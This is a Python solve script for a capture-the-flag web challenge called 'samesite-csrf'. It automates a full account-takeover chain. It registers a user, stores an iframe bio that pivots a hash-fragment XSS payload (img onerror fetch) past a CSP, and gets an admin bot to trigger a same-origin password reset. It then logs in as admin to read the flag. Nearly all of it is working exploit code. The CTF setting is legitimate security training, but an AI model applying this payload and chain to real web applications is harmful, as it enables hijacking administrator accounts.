#!/usr/bin/env python3
"""
Automated solve for 07 · samesite-csrf.

Chain:
  1. Register an attacker account.
  2. Store a bio on the attacker's PROFILE containing an <iframe> that loads the
     home page with an XSS payload in the fragment. The profile page's CSP
     (default-src 'self') blocks inline JS, so the payload can't run there — it
     PIVOTS through the iframe into the CSP-free home-page DOM sink
     (app.js: location.hash -> innerHTML).
  3. Report the attacker's profile link. The admin bot opens it; the payload
     runs in the admin's session and issues a SAME-ORIGIN POST /password-reset
     (SameSite=Lax allows it; httpOnly doesn't matter — we ride the cookie).
  4. Log in as admin with the password we chose and read GET /admin.

Usage:  python3 solve.py [base_url]      (default http://127.0.0.1:8007)
"""
import http.cookiejar
import re
import secrets
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8007").rstrip("/")
ATTACKER = "solver_" + secrets.token_hex(3)
NEW_ADMIN_PW = "owned_" + secrets.token_hex(4)


def opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))


def post(op, path, data):
    req = urllib.request.Request(BASE + path, data=urllib.parse.urlencode(data).encode())
    return op.open(req)


def get(op, path):
    return op.open(BASE + path).read().decode()


def main():
    op = opener()

    # 1. attacker account
    post(op, "/signup", {"username": ATTACKER, "password": "pw"})
    print(f"[+] registered attacker: {ATTACKER}")

    # 2. stored pivot payload on the attacker's profile
    inner = (
        "<img src=x onerror=fetch('/password-reset',{method:'POST',"
        "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
        "body:'password=" + NEW_ADMIN_PW + "'})>"
    )
    bio = '<iframe src="/#%s"></iframe>' % urllib.parse.quote(inner)
    post(op, "/settings/bio", {"bio": bio})
    print(f"[+] stored iframe-pivot payload (resets admin pw -> {NEW_ADMIN_PW})")

    # 3. report the profile -> admin bot visits it
    profile_url = f"{BASE}/profile/{ATTACKER}"
    post(op, "/report", {"url": profile_url})
    print(f"[+] reported {profile_url}; waiting for the admin bot...")

    # 4. poll for the reset to take effect, then read the flag
    for attempt in range(12):
        time.sleep(2)
        admin = opener()
        try:
            post(admin, "/login", {"username": "admin", "password": NEW_ADMIN_PW})
        except urllib.error.HTTPError:
            continue  # not reset yet
        body = get(admin, "/admin")
        m = re.search(r"SecurinetsENIT\{[^}]*\}", body)
        if m:
            print(f"[+] admin password reset; logged in as admin")
            print(f"[+] FLAG: {m.group(0)}")
            return 0
    print("[-] chain did not complete (bot slow, or challenge hardened differently)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
